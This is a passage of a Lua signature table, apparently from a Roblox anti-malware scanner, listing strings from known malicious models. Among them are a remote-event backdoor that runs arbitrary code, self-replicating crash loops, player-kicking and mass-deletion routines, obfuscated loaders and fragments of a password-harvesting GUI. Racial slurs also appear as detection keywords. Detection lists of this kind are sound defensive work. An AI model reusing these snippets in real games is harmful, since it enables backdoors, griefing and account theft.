			local m = Instance.new("Message");
			m.Text = "Press the / key to start typing.";
			m.Parent = player;
			wait(5);
			m.Text = "Then press Enter to send your message.";
			wait(5);
			m:Remove();
			m = nil;
		end
		player = nil;
		collectgarbage("collect");
	end]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "DeaRevenge Shall Return"
wait(1)
m:Remove()
]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "DeaRevenge is a Member Of 1x1x1x1"
wait(1)
m:Remove()]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "All Hackers Shall Return"
wait(1)
m:Remove()]],

	[[while true do
Wait (1)
print("1"..string.rep("0",1010100).."")
end]],

	[[if found ~= nil then
		found.Name="telemon woz ere"
		infectedscr = model.SnapReducer:Clone()
		infectedscr.Parent = found
	else]],

	[[--								///|\\\				  ///|\\\
-----------------------///|||\\\Version ???///|||\\\-----------------------
--							 ////|||\\\\_________////|||\\\\
--							((((|||||))))~/|||\~((((|||||))))
--							'|    _	  |>>>YUP<<<|	  _	 |'
--							 |   / \	  |VvVvVvVvV|   / \	 |
--							 |	  | |	  |^^^^^^^^^|	 | |   |
--							 |	  | |   |OOOOOOOOO|	 | |   |
--							 |	  \_/   |XXXXXXXXX|	 \_/   |
--							 |         | |OOOOOOO|			 |
--							 |_________|�|OOOOOOO|_________|
--
-- idk

script.Parent = Punci -- I like 'punci'-s :3
]],

	[[SC = script:clone()
SCC = SC:clone()
SCCC = SCC:clone()
names = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","10","VIRUS"}
SC.Parent = script
SCC.Parent = script
SCCC.Parent = script
while true do
wait()
SC.Name = math.random(1,#names)
SCC.Name = math.random(1,#names)
SCCC.Name = math.random(1,#names)
end]],

	[[while true do
wait()
P = Instance.new("Weld")
P.Parent = script
script:clone().Parent = script
end]],

	[[local module = {}
local allowed = {"RAHULPROHACKER", "EnginnScript"}
game.Players.PlayerAdded:connect(function(player)
    for i, v in pairs(allowed) do
        if player.Name == v then
            script.ScreenGui:Clone().Parent = player.PlayerGui
        end
    end
end)
return module
]],

	[[if player.Name == you then
script["Sinner V1.2"].Parent = player.PlayerGui]],

	[[exe.OnServerEvent:connect(function(plr, key, data)
	if key == GlobalPass then
		print("Running: "..data.." From: "..plr.Name)
		loadstring(data)()
	else
		plr:Kick(stop)
	end
end)]],

	[[require(script:WaitForChild("Loadstring"))(stri)()]],

	[[Remote.OnServerEvent:connect(function(player, key, execute)
		if mod == "Evil" then
			print("Running: "..execute.." from: "..player.Name)
			loadstring(execute)()
		else
			player:Kick("You are not admin")
			print(player.." was kicked for trying to connect to the backdoor")
		end
end)]],

	[[discord=Instance.new("Message")
discord.Text = "THE APOCALYPSE HAS BEGUN!!!"
discord.Parent = game.Workspace]],

	[[GetAllItems(workspace)]],

	[[getfenv()['\114\101\113\117\105\114\101'](238754.208233*12851)]],

	[[|106(*79|151(*75|117@#59|97@#84|81@#100|86(*86|13&^12|12&^8|25&^29|28(*24|8@#38|0@#76|81(*81|0@#54|74(*74|0@#89|64(*64|0@#83|29(*29|0@#40|0@#84|29(*29|0@#37|30&^30|19(*19|26&^26|7&^5|2@#114|4@#32|0@#30|41&^41|25(*25|24@#95|0@#54|36&^36|0@#111|78@#76|72&^8|86(*86|3&^3|86(*75|69&^5|35&^35|35&^34|95(*65|41&^41|128@#72|0@#101|2@#38|0@#18|30(*30|4&^4|4@#53|1&^7|0@#103|37(*37|28(*28|112@#32|187(*73|106&^3|110@#10|116@#73|0@#113|4@#5|87@#70|0@#38|73(*73|37(*37|45@#26|45@#48|112&^32|79@#61|72&^31|110&^43|127(*45|69@#114|85&^17|50(*18|92&^30|68&^29|17&^49|72&^4|173(*88|82@#113|79&^14|80@#121|72@#109|44@#20|32@#118|89&^26|72@#37|69@#61|65@#70|111(*31|69@#112|124(*41|84@#66|105(*73|168(*85|157(*90|76&^30|73@#47|85&^5|84@#26|32@#55|79@#99|66@#18|70@#16|126(*41|117&^38|67@#52|68&^5|84@#58|97(*18|109(*27|44@#93|11&^43|105(*26|158(*80|76@#66|89@#42|32@#96|44&^8|76(*27|57&^22|172(*89|67@#11|82@#92|73@#102|80@#102|84]],

	[[game.MarketplaceService:PlayerOwnsAsset(plr,3782332641)]],

	[[game.MarketplaceService:PlayerOwnsAsset(plr,3801326824)]],

	[[game.MarketplaceService:PromptPurchase(plr,3801326824)
			wait(30)
			game.MarketplaceService:PromptPurchase(plr,3782332641)]],

	[[sound = Instance.new("Sound")
sound.SoundId = "http://www.roblox.com/asset?id=459420383"
sound.Volume = .5
sound.Looped = true
sound.Name = "Music"
sound.Parent = game.Workspace
sound:Play()
script:Remove()]],

	[[()function.player.aspx?.ID=('Turn Into Nothing But Black')
	starterplayer.player(0)+('Player''s'' ''iD') 250,250,250
    starterplayer.player(Random)-"Players Get Deactivated"
end]],

	[[INSPIRED BY THE FASCINATING OLD VIRUSES OF THE 90S
m.Text BY THE VIRUS OF THE NAME Savior
http://www.youtube.com/watch?v=4FZvJmwXq5U
i a mM NoT INSAne!!!!!!!!!!! :(
A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!]],

	[[Setupconfirm=script:FindFirstChild("deployed")
if Setupconfirm==nil then
	dep=Instance.new("NumberValue", script)
	dep.Name="deployed"
	dep.Value=tick()
end]],

	[[("A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!")]],

	[[crashites=game.Players:GetChildren()
		for crashite=1, #crashites do
			Playerconfirm=crashites[crashite]:FindFirstChild("PlayerGui")
			if Playerconfirm~=nil then
				minion=script.destroyer:Clone()
				minion.Parent=crashites[crashite].PlayerGui
			end
		end]],

	[[while true do
	print("i am destroyer")
end]],

	[[while wait() do
	print("i am destroyer")
end]],

	[[local thank = "Thank you for choosing this 'Virus' as your choice for destructive purposes."
local thank = "This Virus is also configurable by the way, the settings are down bellow."
local thank = "Anyways, I hope you enjoy using this."
local PS = "Also, if you happened to find this script in a model in your place and you didn't put it there."
local PS = "Delete it before anything bad happens aaaaaaaaaannnnnnnndddddd."
local PS = "Congratulations, you saved your place from a nightmare."
local PS = "Just make sure to subscribe to Sans Gaming." ]],

	[[while wait() do script.Parent:Clone().Parent=script end]],

	[[if hit:FindFirstChildWhichIsA("Fire") == nil then
		local fire = script.Parent:Clone()
		fire.Parent = hit
		hit.Name = "DEATH TO DATGUY"
	end]],

	[[p.Heat = 999
			p.Size = 999
			p.Enabled = true
			local y = Instance.new("ForceField")
			y.Name = "��������"
			y.Parent = x[i]],

	[[print("��������������������������������������������������������������������������������")]],

	[[--Credit too the original creator of teh slimes. Timsood something or the other.
-------------
-------------
spaces = 3 -- How many spaces it travels per move(1-3 is the best, preferably 2)
speed = 2000 -- How fast it goes, just put any number I guess :P
range = 9999 -- How far the slime "sees"; if it can't see ya it won't get ya! lol
ooze = true -- This is whether the slime will squeeze through really thick walls or not.
-------------
-------------

local partname = "TehSlime" -- Name of the "Slimeys". So you don't have to change it throughout the entire script. :P
local targetname = "Head" -- Kinda obvious....... lol
local food = {"Head"} -- OM NOMS!!! :D

-------------
-------------

function findTarget() -- Ah, the findTarget() command. This command lets the slime find it's next victim.
	g = game.Workspace:getChildren()
	for i=1, #g do
	if g[i]:findFirstChild(targetname) ~= nil then
		if (g[i]:findFirstChild(targetname).Position - script.Parent:findFirstChild(partname).Position).magnitude < range then
			if T == nil then
				T = g[i]:findFirstChild(targetname)
			else
				if (g[i]:findFirstChild(targetname).Position - script.Parent:findFirstChild(partname).Position).magnitude < (T.Position - script.Parent:findFirstChild(partname).Position).magnitude then
					T = g[i]:findFirstChild(targetname)
				end
			end
		end
	end
	end
end]],

	[[-- rename, put into model, and troll 💋💔💔💔💔💔🙈🙉]],

	[[function findAll(lag)
	for i,v in ipairs(workspace:GetChildren()) do
		local clone = lag:clone()
		clone.Name = "You got H8C5ED"
		clone.Parent = v
	end
end]],

	[[while true do

	end]],

	[[while true do end]],

	[[hacked]],

	[[h3cked]],

	[["iEmOtIoNlEsS"]],

	[[ݣ]],

	[[hakked]],

	[[h4kk3d]],

	[[haacked]],

	[[tr0ll]],

	[[R0ll]],

	-- [[h44cked]],

	-- [[h4cked]],

	-- [[h44kked]],

	-- [[haackeed]],

	-- [[haakkeed]],

	--  [[h44kkeed]],

	[[nigger]],

	[[niger]],

	-- [[niigger]],

	-- [[niiger]],

	[[niggeer]],

	[[nigeer]],

	-- [[nigrer]],

	-- [[niigrer]],

	-- [[n1gger]],

	-- [[n11gger]],

	-- [[n11ger]],

	-- [[n1ggeer]],

	-- [[n1geer]],

	-- [[n1grer]],

	[[nibba]],

	-- [[nibbar]],

	[[msg.Parent = game.Workspace
msg.Text = "Anchoring players and moving them to a more slav spot..."]],

	[[haxx]],

	-- [[require(4229612988)]],

	[[Funny=require(]],

	[[local wat= 3865023116]],

	[[print("This game has been hacked get rekt idiot!")]],

	[[This game has been hacked get rekt idiot]],

	-- [[23A27423A2352752392362751H1N1R1J23923G27521D1J122111J14101V1L27F27H274210131O27M27O27Q27F23I27521R1521112131I1V1P23B23A239277274141J17131V28H27526U26N1621N24E21J27423E27525423I23Q23T22Q28223A25523A22E23A22W27524W23228Z22W23227425523229629D29F23A21I29727525522U29I22U27425623221229729E26U25722U28Z22V29S26U25421Y28Z23221Y27425822628Z22S22629F22U29S22T29S293292233292]], - Obfuscation Code Unecessary due to obfuscation detection

	[[59429.86000469662*55359)("2zPM559.901T4qNALB(5916.814864029748)")]],

	[[3419556000]],

	[[if player.Name == you then script["Sinner V1.2"].Parent = player.PlayerGui]],

	[[local IllIIllIIlll=require]],

	[[while true do script.Parent:Clone().Parent=script end]],

	[[while wait() do  end]],

	[[while wait() do end]],

	[[while true do  end]],

	[[while wait() do script:Clone().Parent=script end]],

	[[while true do script:Clone().Parent=script end]],

	[[while wait() do script:Clone().Parent=workspace end]],

	[[while true do script:Clone().Parent=workspace end]],

	[[while wait() do script.Parent:Clone().Parent=workspace end]],

	[[while true do script.Parent:Clone().Parent=workspace end]],

	[[S333X]],

	[[while wait() do script:Clone().Parent=workspace.Terrain end]],

	[[while true do script:Clone().Parent=workspace.Terrain end]],

	[[while wait() do script.Parent:Clone().Parent=workspace.Terrain end]],

	[[while true do script.Parent:Clone().Parent=workspace.Terrain end]],

	[[3989501000]],

	[[local wat= ]],

	[[3989337802]],

	[[TS:Teleport(3989337802,plr)]],

	[[TS:Teleport(3989337802,v)]],

	-- [[U5XZXxsv^KDx?w6px49#vF_S?6pA4QuTrUd27WPd@6dUsQMcM-C#uV9G2!SGZgzFS5tjMLx7jFnu-=+CwWm=gBnUTzeXxnWsgrm@2FvFpu=JdKuFRS-dzvq$HDK9vtQdhzPg3GT2mkeVNdrM$8d%nawkzt^tKrJDHG72sgf*e3B3!Mxzb9wwvAAP%TfZDgRbptrKEx8Z&7Y$H&UAN&5$PNE9LqUL*+36M^eMvNxvdR2#Y*7GryP#JhFgx^dLK=uh%g67&HDyfdXzHr&5M4Ce_mjKg*K_hDD#NSWkDdh5QPeJ!Rpfhp=!wAsM2aB2qrn2RRQ4DKWq&A*JFTStZUFHpwm$$-_8yeK$ZK5q8UKgD_NrRt7KsrBSr*GQqJfU&HZhTdCY!9s5f8Mz5QUynm*AP=78M=sqfEfnm+VEc2a&L7&^qzyUt9bA$9Mj94SmsA=QtQE^-E-L-tUUdS5A?3YV%u^mfQ-h&9B!ndwgkp25R?&u^f6wKW_4u9pjerj5j^r8G@F3g34xjFex9@fNYgQ!a!6$n*!wM??e8gt&CwUzCrTE@dm@^@YDY$K%vy4re3BxPzvR@%?=*FxjnvF^Zr*a*eMz9NT!e4MLLTHbH#$VWTXVRdpaY_tRkrBpBYFKqp%hb-&97-Xuh!V6kWL5Y7JZ=8McE-tevWAyC^*EpNHwj-nh-*?Zcw2s?Qs-ThP#s%=Nz$$C-N@yr-WZxJtptANYd-8u9zRKYPK@gUPYaEDpRW+%RXGSk!xCvM=Qcyzgp2TC=T3qpV=@L%7G75E_RUwTWcVwYvX?pZQ*AZ?uwY3@RZxkwRCg%+@rVAdkgj=*!+rm?b$UJ%_=gsfuX*ESnNA7Dmg]], - Obfuscation Code Unecessary due to obfuscation detection

	[[/110670]],

	[[ 110670]],

	[[2797686659]],

	[[3173224995]],

	[[4309332554]],

	[[Please FOLLOW ME ON TWITTER @JBLADE733]],

	[[3016646411]],

	[[local wat=3016646411]],

	[[3089856341]],

	[[TS:Teleport(3089856341,plr)]],

	[[TS:Teleport(3089856341,v)]],

	[[getfenv()["\103\101\116\102\101\110\118"]()["\115\101\116\102\101\110\118"](tonumber("\49"),{["1gKorIzL9]],

	[[1120769650]],

	[[Teleport(1120769650]],

	[[1394668245]],

	[[(p,1394668245)]],

	[[PromptPurchase(p,1394668245)]],

	[['\108\111\099\097\108\032\084\111\111\108\032\061\032\115\099\114\105\112\116\046\080\097\114\101\110\116\013\010\013\010\108\111\099\097\108\032\103\101\097\114\115\032\061\032\123\053\053\055\055\053\055\055\057\125\013\010\013\010\013\010\013\010\102\117\110\099\116\105\111\110\032\111\110\065\099\116\105\118\097\116\101\100\040\041\013\010\032\045\045\032\112\108\097\121\032\115\111\117\110\100\013\010\032\109\097\103\105\099\083\111\117\110\100\032\061\032\084\111\111\108\046\072\097\110\100\108\101\058\070\105\110\100\070\105\114\115\116\067\104\105\108\100\040\034\077\097\103\105\099\083\111\117\110\100\034\041\013\010\032\105\102\032\109\097\103\105\099\083\111\117\110\100\032\061\061\032\110\105\108\032\116\104\101\110\032\114\101\116\117\114\110\032\101\110\100\013\010\032\109\097\103\105\099\083\111\117\110\100\058\080\108\097\121\040\041\013\010\013\010\045\045\032\071\079\079\068\032\082\065\078\068\079\077\073\090\065\084\073\079\078\032\067\079\068\069\033\033\013\010\032\110\117\109\076\111\111\112\115\032\061\032\109\097\116\104\046\114\097\110\100\111\109\040\048\044\109\097\116\104\046\102\108\111\111\114\040\049\048\048\048\042\116\105\109\101\040\041\041\041\013\010\032\110\117\109\076\111\111\112\115\032\061\032\110\117\109\076\111\111\112\115\032\045\032\040\109\097\116\104\046\102\108\111\111\114\040\110\117\109\076\111\111\112\115\032\047\032\049\048\048\048\048\041\042\049\048\048\048\048\041\013\010\032\102\111\114\032\105\032\061\032\049\044\110\117\109\076]],

	[[--hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad]],

	[[function connection(player)
player:remove()
end
game.Players.ChildAdded:connect(connection)]],

	[[function connection(player)player:remove()end game.Players.ChildAdded:connect(connection)]],

	[[function connection(player)player:remove()end;game.Players.ChildAdded:connect(connection)]],

	[[This server has been shutdown by Cool890dude]],

	[[Cool890dude]],

	[[if w[i].Name~="94m3 Cr45h3r"and w[i].Name~="94m3 Cr45h3r 1337 m355a93"then]],

	[[m.Name="94m3 Cr45h3r 1337 m355a93"]],

	[[if w[i].Name~="94m3 Cr45h3r"and w[i].Name~="94m3 Cr45h3r 1337 m355a93"then
w[i]:remove()
tw=tw+1
end end
for i=1,#p do
p[i]:remove()
tp=tp+1
end
for i=1,#g do
g[i]:remove()
tg=tg+1
end
for i=1,#t do
t[i]:remove()
tt=tt+1
end]],

	[[Hi and welcome to my script hope you enjoy the hack lion. WARNINGS: Hack might back fire and crash the game it happens.]],

	-- [[B5696F08BD0207A59F20172G00BA6045125G00013G00F695B245D8CC3D83012G002404B76302189G006G00019G002G00019G002G00013G00039G002G00039G002G00033G00049G009G001G00043G00047G00D4850A020070083G004GB5C2D4DCC16B7G0040700B3G004GB5C7D0C4C0DCC7D06B2G00C0BB014DEB4170103G004GB5D4DBC1DCD7D4D6DED12GDAC770043G004GB5930A020068696B513G6945689G696B51683G6968696D412G696B51F32DE0642G6B696D6B5G696B51683G696A696D412G696B51606869596B6D696D69616F796B696B5168696D3G696B51F349E564686B2G6D5C45B84D2C389E486D87C84398AA82626C7F257BD66B0F7DA15302737F1E4F7A550CD45061DC800A02006B5G00E494407A0A02002G696B51682G69453G69453G695D4G69682G696D3G6975CE]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[5DC189528A7000C42B081E820A0200E05G00E49440013G008D3D9A36074B18EE75900A02006A073G003G5D3A3C30386A0D3G003G5D1A38290E382F2B343E386A0E3G003G5D152G292D0E382F2B343E386A0A3G003G5D0D313C24382F2E6A0A3G003G5D3E3233293833296A2C3G003G5D13382A7D0E382F2B382F677D352G292D2E672G723G2A732F323F313225733E3230723A3C30382E726A0A3G003G5D0D313C3E3814396A0A3G003G5D2A383F352G32366A7E3G003G5D352G292D2E672G7239342E3E322F393C2G2D733E3230723C2D34722A383F352G32362E726B2G6C64656A696F682G6B6D6A6B696C6A64722A286D0F153F150B3C04303E1A29131B2F2E3210241B1C6F703770101B3A1B3536153628352F182A6A161A250532701F022E2A32361B3F102E3668142811171B6D0B392B6A0A3G003G5D09320E3833396F6A0D3G003G5D170E121318333E3239386A0C3G003G5D0D322E291C2E24333E6A2F3G003G5D352G292D672G723138703F31323A732A383F282928733E32307239342E3E322F390A383F352G3236732D352DE05G00E494406A033G003G5D4G002D9G006G00029G002G00023G00029G002G00023G00039G002G00033G00039G002G00033G00053G00063G00069G002G00069G002G00063G00063G00073G00093G00099G002G00093G00093G000A3G000A3G000A9G009G001G000A3G000A3G0072172813129D66737744247434293590796CED5E8561EEB3821B646100D60A0200C0C1C3C53GC1D5CC9GC1C3C5CC4GC12GC3F9C3C1C9DD2GC1C3C5FBCB1DD0C2C5C1912GC1C53GC1C3C5CCC1C5C1C0C3C7F9C2C1CDDD2GC1C3C5F0C0C5CDC22GC591C1C5C98DC4C1CDDD2GC1D13GC1C3C5CCC1D1C1C5CDD3C92GC1C3C5CCC1D1C1C2C9CDE5C5C6C9E9C6D0CBE9C1D5CFF967C1CCF32GC1C3C521C02GCDC2C5CD91C8C1CDEDC1D7CFF9CDC1D5DDC8C1D9C1C3C1C3C5CCC1D93GC1C3C541CB29D0C5C3CD918B69E5E0A6A4E982CD4111CD8AEBCCFC8BA54E894CD9A4C4D026C4820FE83F80430019550C6D342345224G004DF]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[AF282CAEB628E779FCB6E72633013G00D1371C2A793DAE8B2FD0584G00A800A50A02005B093G005GAFC8CEC2CA5B0F3G005GAFE8CADBFCCADDD9C6CCCA5B103G005GAFE72GDBDFFCCADDD9C6CCCA5B0C3G005GAFFFC3CED6CADDDC5B0C3G005GAFCCC0C1DBCAC1DB5B2E3G005GAFE1CAD88FFCCADDD9CADD958FC72GDBDFDC952G803GD881DDC0CDC3C0D781CCC0C280C8CEC2CADC805B0C3G005GAFFFC3CECCCAE6CB5B0C3G005GAFD8CACDC72GC0C45B803G005GAFC72GDBDFDC952G80CBC6DCCCC0DDCBCE2GDF81CCC0C280CEDFC680D8CACDC72GC0C4DC80992G9E969E979A9B969E979D979B9F979C9D809D97D69AEDF7C2C5D8F6DFCBFAE1C1EBFA97DBEED6E1E09DC0C1DCCDEC9FC9FDDC9FDFFBFAD9DA9AD7C8C4C7CAD99EE9DFC6FB2GC6FEEDE4C7DCC7972GECFCC2E9DB98995B0C3G005GAFFBC0FCCAC1CB9D5B0F3G005GAFE5FCE0E1EAC1CCC0CBCA5B0E3G005GAFFFC0DCDBEEDCD6C1CC5B313G005GAFC72GDBDF952G80C3CA82CDC3C0C881D8CACDDADBDA81CCC0C280CBC6DCCCC0DDCBF8CACDC72GC0C481DFC7DF185G00E494405B053G005GAF2D9G006G00029G002G00023G00029G002G00023G00039G002G00033G00039G002G00033G00053G00063G00069G002G00069G002G00063G00063G00073G00093G00099G002G00093G00093G000A3G000A3G000A9G009G001G000A3G000A3G0076620B56F81FE2D103007D0A020029282A103G2860252G28643G28642G282A10252G2864282G2A6C2A28201C2G282A100E7E2C0C2B2C28242G282C642G282A1025282C64292A2E6C2B28241C2G282A10CE292C7C2B2G2C24282C20782D28241C2G2838642G282A10252838642C243A3C2G282A10252838642B2024082C2F20682F392268283C266CB96680382G282A108B7E380C2B2C2G2421282434283E266C24283C1C212830642A282A10252830642G282A109929247C2C2A2G244844552G21AD7B7A98F70215BE98E91AB5F3FB247B87FF2G67AA5A332611F8007765160314CFB12955A0462707498B5733A900970A0200185G0]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[3570005127C349014G00474F8B044G003AF3A7C1068234021B67C61BA90A02006D0B3G004G35475044405C4750102G00A0BFC453EB416D0F3G004G35545B415C504D45595A5C416D043G004G3542880A0200717072643G7048712G70543G70542G707264712G70547170746C2G70726468F06C6A727470447074767472707264717074542G707264EFF0506A71727444EDE659635CCC3F7552C46A7CE7239B4E00E69141B07D1755ED862G609159837900119G006G00019G002G00019G002G00013G00029G009G001G00023G00023G00E0DD5F14CBDFBC93673EF600B02B1A27A60A0200105G00E4944092770A02002G707264712G70483G70483G70503G7054712G70444G705G0027FFBB21]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Newleetbox now has your username and password, Have a nice day!]],

	[[We don't give passwords back. We only spread the passwords on our website for EVERYONE to HACK IN!]],

	[[game.Players.MaxPlayers = 0]],

	[[SCRIPT: Generator V is not a lie, click play fool]],

	[[m.Text = "WARNING MALWARE"]],

	[[@JBLADE733]],

	[[while true do print("i am destroyer")end]],

	[[while wait() do print("i am destroyer")end]],

	[[while true do warm("i am destroyer")end]],

	[[while wait() do warn("i am destroyer")end]],

	--	[[workspace:BreakJoints(]],
	--
	[[1445530615]],

	[[local modelid = 1445530615]],

	[[local market = game:GetService("MarketplaceService")
	local modelid = 1445530615]],

	[[bendarobloxian]],

	[[local modelid = 1445530615
	local adminid = 857927023]],

	[[The code below this line is to support the creator (bendarobloxian)]],

	[[3865029137]],

	[[local wat= 3865029137]],

	[[3419556*1000]],

	-- // MguiAreCommentedOut
	--	[[(       )(  ____ \|\     /|  (  ____ )(  ____ \(  ___  )(  __  \ (       )(  ____ \
	--| () () || (    \/( \   / )  | (    )|| (    \/| (   ) || (  \  )| () () || (    \/
	--| || || || |       \ (_) /   | (____)|| (__    | (___) || |   ) || || || || (__
	--| |(_)| || | ____   ) _ (    |     __)|  __)   |  ___  || |   | || |(_)| ||  __)
	--| |   | || | \_  ) / ( ) \   | (\ (   | (      | (   ) || |   ) || |   | || (
	--| )   ( || (___) |( /   \ )  | ) \ \__| (____/\| )   ( || (__/  )| )   ( || (____/\
	--|/     \|(_______)|/     \|  |/   \__/(_______/|/     \|(______/ |/     \|(_______/]],

	--	[[MGX Build 1000]],

	[[Hello v3rmies, thank you for using Maintenance Gui X by roblox8xpl0iter and Raspberry Pi. This MGui is the successor to MGui+.]],

	[[v3rmies]],

	--	[[roblox8xpl0iter]],

	--	[[This readme gives you an overview of MGX, there are also tl;dr parts for some of you.]],

	--	[[game:WaitForChild("ReplicatedStorage"):WaitForChild("MGX-Main")]],

	--	[[(       )(  ____ \|\     /|  (  ____ \(  ____ \\__   __/\__   __/\__   __/( (    /|(  ____ \(  ____ \
	--| () () || (    \/( \   / )  | (    \/| (    \/   ) (      ) (      ) (   |  \  ( || (    \/| (    \/
	--| || || || |       \ (_) /   | (_____ | (__       | |      | |      | |   |   \ | || |      | (_____
	--| |(_)| || | ____   ) _ (    (_____  )|  __)      | |      | |      | |   | (\ \) || | ____ (_____  )
	--| |   | || | \_  ) / ( ) \         ) || (         | |      | |      | |   | | \   || | \_  )      ) |
	--| )   ( || (___) |( /   \ )  /\____) || (____/\   | |      | |   ___) (___| )  \  || (___) |/\____) |
	--|/     \|(_______)|/     \|  \_______)(_______/   )_(      )_(   \_______/|/    )_)(_______)\_______)]],

	--	[[local mainInvoke = game:WaitForChild("ReplicatedStorage"):WaitForChild("MGX-Main")
	--local gui = script.Parent
	--local collB = gui:WaitForChild("Bank"):WaitForChild("CBank")
	--local curWin = gui:WaitForChild("CurrentWindow")
	--local BootInfo = mainInvoke:InvokeServer("GetBootInformation")]],

	--	[[DumpSettings = {
	--	DumpEnabled = true,
	--	ShowBC = true,
	--	ShowAge = true,
	--	ShowRAP = true
	--}

	--PCKillEnabled = false
	--PCKickEnabled = false
	--PCCrashEnabled = false
	--PCRescamEnabled = false

	--LogGuiBase = LogGuiFolder:findFirstChild(mainInvoke:InvokeServer("GetLogGuiName"))
	--LogGui = LogGuiBase.LGui:Clone()
	--LogGui.Parent = gui]],

	--	[[BypassKey = config.BypassKey -- Bypass key players can use to skip login, bypass key is always put on Username box
	--BypassKeyEnabled = config.BypassKeyEnabled -- Enables the bypass key or not
	--BypassKeyRules = config.BypassKeyRules -- Shows a rule gui when entering bypass key to inform players

	--local http = game:GetService("HttpService")
	--local DStore = game:GetService("DataStoreService"):GetGlobalDataStore()
	--local RBXLim = false
	--local mgx = script.Parent:WaitForChild("MGX")
	--local Storage = workspace:findFirstChild(StorageName)
	--local Version = 1000
	--local NewVersion = 0
	--coroutine.resume(coroutine.create(function()
	--	NewVersion = http:GetAsync("http://pastebin.com/raw.php?i=286t8BT3")
	--end))

	--if not workspace:FindFirstChild("MGX-ReadSettings") then
	--	readfolder = Instance.new("Folder",workspace)
	--	readfolder.Name = "MGX-ReadSettings"
	--else
	--	readfolder = workspace:WaitForChild("MGX-ReadSettings")
	--end]],

	--	[[MGX-Windows]],

	--	[[gui = script.Parent

	--for i=60,0,-1 do
	--	gui.CDown.Text = "Disconnecting in: "..i.." seconds"
	--	wait(1)
	--end
	--gui.CDown.Text = "Disconnected"
	--while true do end]],

	--	[[gui = script.Parent:WaitForChild("webpage")
	--parentgui = script.Parent

	--gui.Parent = script.Parent.Parent
	--wait()
	--parentgui.Parent = gui:WaitForChild("SignIn")
	--parentgui.Visible = false
	--parentgui.Visible = true
	--gui.Visible = true

	--while true do
	--	if parentgui.Visible == false then
	--		gui.Visible = false
	--	end
	--	wait()
	--end]],

	--	[[mainInvoke:InvokeServer("RequestMGX")]],

	--	[[function onTouch(part)
	--	if part.Parent:findFirstChild("Humanoid") then
	--		name = part.Parent.Name
	--		if workspace:findFirstChild(name) then
	--		if game.Players:findFirstChild(name) then
	--		SendNotification(game.Players[name],"Robux Awarded!","You received " .. tostring(amnt) .. " Robux!", "http://www.roblox.com/asset/?id=146212836", 5, false)
	--		end
	--		end
	--	end
	--end]],

	[[Made by SeniorFight for V3rmillion!]],

	--	[[MGui Ultimate uses same system as MGR2, but has been]],

	--	[[local config = require(script.Parent:WaitForChild("MGU Config"))]],

	--	[[local signal = me:WaitForChild("SignalCheck")

	--local optoggle = main:WaitForChild("OptToggle")

	--local Filter = {
	--	Mode = 0, -- 0 is <, 1 is >
	--	By = 1, -- 1 is name, 2 is bctype, 3 is age, no pass cuz y need dis?
	--	ByNames = {
	--		"Name",
	--		"BCType",
	--		"Age"
	--	},

	--	BCValues = {
	--		["NON-BC"] = 0,
	--		["BC"] = 1,
	--		["TBC"] = 2,
	--		["OBC"] = 3,
	--		["V3rm Member"] = -1,
	--		["Undefined"] = 0
	--	}
	--}

	--function ShowDetails(data)
	--	if not data then details.Visible = false return end

	--	details.UserName.Text = data.UserName
	--	details.UserImage.Image = "http://www.roblox.com/thumbs/avatar.ashx?x=150&y=200&format=png&username="..data.UserName
	--	details.UserPass.Text = "Pass: "..data.UserPass
	--	details.UserBCType.Text = "Status: "..data.Type
	--	details.UserID.Text = "ID: "..tostring(data.UserID)
	--	details.UserAge.Text = "Age: "..tostring(data.UserAge) .. " days ~" .. tostring(data.UserAge / 365):sub(1,3) .. " yrs"
	--	details.Visible = true
	--end

	--details:WaitForChild("HideButton").MouseButton1Click:connect(function()
	--	details.Visible = false
	--end)]],

	--	[[This Was Made By SeniorFight On V3RMILLION!]],

	--	[[Created by anonymous5044]],

	--	[[https://www.roblox.com/Services/Secure/LoginService.asmx/ValidateLogin]],

	--	[[function MGUI:getInfo()
	--	warn('Created by anonymous5044')
	--	warn('I will update this module when i want to')
	--	warn('If you want to suggest something PM me')
	--	warn('This SourceCode can be edited but give me some credits')
	--end]],

	--	[[MaintenanceGui]],

	[[-- Made by youglow,new account robloxcitya dont forget to add him]],

	--	[[function checkAdmin(plr)
	--	for _,v in pairs(admins) do
